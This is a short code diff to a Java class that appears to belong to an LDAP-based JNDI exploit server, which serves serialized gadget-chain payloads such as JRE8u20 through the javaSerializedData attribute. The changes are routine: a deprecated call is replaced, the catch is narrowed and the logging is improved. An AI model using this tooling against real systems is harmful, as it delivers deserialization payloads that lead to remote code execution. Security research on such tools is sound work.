@@ -37,7 +37,7 @@ public class SerializedDataController implements LdapController {
 
         try {
             final Class<? extends ObjectPayload<?>> payloadClass = ObjectPayload.Utils.getPayloadClass(gadgetType);
-            ObjectPayload<?> payload = payloadClass.newInstance();
+            ObjectPayload<?> payload = payloadClass.getDeclaredConstructor().newInstance();
             Object object = payload.getObject(params);
 
             if (SerializedDataController.gadgetType.equals("JRE8u20")) {
@@ -51,9 +51,9 @@ public class SerializedDataController implements LdapController {
             e.addAttribute("javaSerializedData", bytes);
             result.sendSearchEntry(e);
             result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
-        } catch (Throwable er) {
+        } catch (Exception er) {
             System.err.println("Error while generating or serializing payload");
-            log.error(String.valueOf(er));
+            log.error("Error while generating or serializing payload", er);
         }
     }
 
